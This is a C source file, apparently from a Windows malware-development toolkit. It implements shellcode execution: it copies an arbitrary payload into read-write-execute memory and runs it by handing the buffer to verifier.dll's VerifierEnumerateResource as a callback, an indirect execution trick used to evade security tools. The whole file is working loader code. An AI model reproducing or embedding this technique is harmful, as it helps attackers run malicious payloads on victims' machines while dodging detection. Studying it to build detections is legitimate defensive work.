#include "Win32Helper.h"


VOID InvokeVerifierEnumerateResourceCallbackRoutine(LPVOID lpParameter)
{
	typedef ULONG(NTAPI* AVRF_RESOURCE_ENUMERATE_CALLBACK)(PVOID ResourceDescription, PVOID EnumerationContext, PULONG EnumerationLevel);
	typedef ULONG(WINAPI* VERIFIERENUMERATERESOURCE)(HANDLE, ULONG, ULONG, AVRF_RESOURCE_ENUMERATE_CALLBACK, PVOID);
	VERIFIERENUMERATERESOURCE VerifierEnumerateResource = NULL;
	HMODULE hMod = NULL;

	hMod = LoadLibraryW(L"verifier.dll");
	if (hMod == NULL)
		return;

	VerifierEnumerateResource = (VERIFIERENUMERATERESOURCE)GetProcAddressA((DWORD64)hMod, "VerifierEnumerateResource");
	if (!VerifierEnumerateResource)
		return;

	VerifierEnumerateResource(GetCurrentProcessNoForward(), NULL, 0, (AVRF_RESOURCE_ENUMERATE_CALLBACK)lpParameter, NULL);

	return;
}

BOOL MpfSceViaVerifierEnumerateResource(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeVerifierEnumerateResourceCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}